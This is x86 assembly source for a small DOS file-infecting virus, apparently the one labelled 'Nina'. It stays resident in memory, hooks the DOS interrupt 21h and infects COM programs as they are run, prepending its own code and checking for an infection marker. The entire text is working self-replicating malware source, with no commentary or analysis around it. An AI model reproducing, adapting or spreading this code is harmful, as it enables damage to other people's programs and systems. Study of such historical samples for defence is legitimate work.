

Code		Segment
		Assume	CS:Code,DS:Code,ES:Code
		Org	100h

VLen		=	100h

Start:		push	ax
		mov	ax,9753h
		int	21h
		mov	ax,ds
		dec	ax
		mov	ds,ax
		mov	ax,word ptr ds:[3]
		push	bx
		push	es
		sub	ax,40h
		mov	bx,ax
		mov	ah,4Ah
		int	21h
		mov	ah,48h
		mov	bx,3Fh
		int	21h
		mov	es,ax
		xor	di,di
		mov	si,110h
		mov	cx,VLen
	rep	movsb
		sub	ax,10h
		push	ax
		mov	ax,offset Cont
		push	ax
		retf

PrgBytes	dw	VLen

Cont:		mov	byte ptr cs:[0F2h],0AAh
		mov	ax,3521h
		int	21h
		mov	word ptr cs:Saved21     , bx
		mov	word ptr cs:Saved21 + 2 , es
		push	es
		pop	ds
		mov	dx,bx
		mov	ax,2591h
		int	21h
		push	cs
		pop	ds
		mov	dx,offset Int21
		mov	al,21h
		int	21h
		pop	ds
		pop	bx
		push	ds
		pop	es
StartPrg:	mov	di,100h
		mov	si,ds:PrgBytes
		add	si,di
		mov	cx,VLen
	rep	movsb
		pop	ax
		push	ds
		mov	bp,100h
		push	bp
		retf

VirusCall:	pop	ax
		pop	ax
		pop	ax
		jmp	StartPrg

Int21:		cmp	ax,9753h
		je	VirusCall
		cmp	ax,4B00h
		jne	DoInt21
		push	ax
		push	bx
		push	cx
		push	dx
		push	ds
		call	Infect
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
DoInt21:	db	0EAh	; JMP Far
Saved21		dd	?

Infect:		mov	ax,3D02h
		int	91h
		jc	EndI
		mov	bx,ax
		mov	cx,VLen
		push	cs
		pop	ds
		mov	ah,3Fh
		mov	dx,offset Buffer
		int	91h
		mov	ax,word ptr ds:Buffer
		cmp	ax,4D5Ah
		je	Close
		cmp	ax,5A4Dh
		je	Close
		cmp	word ptr ds:Buffer [2],9753h
		je	Close
		mov	al,2
		call	Seek
		cmp	ax,65200
		ja	Close
		cmp	ax,500
		jb	Close
		mov	ds:PrgBytes,ax
		call	Write
		mov	al,0
		call	Seek
		mov	dx,offset Start
		call	Write
Close:		mov	ah,3Eh
		int	91h
EndI:		ret

Seek:		push	dx
		xor	cx,cx
		xor	dx,dx
		mov	ah,42h
		int	91h
		pop	dx
		ret
		
Write:		mov	ah,40h
		mov	cx,VLen
		int	91h
		ret

		db	' Nina '

Buffer:		int	20h

Code		EndS
		End	Start
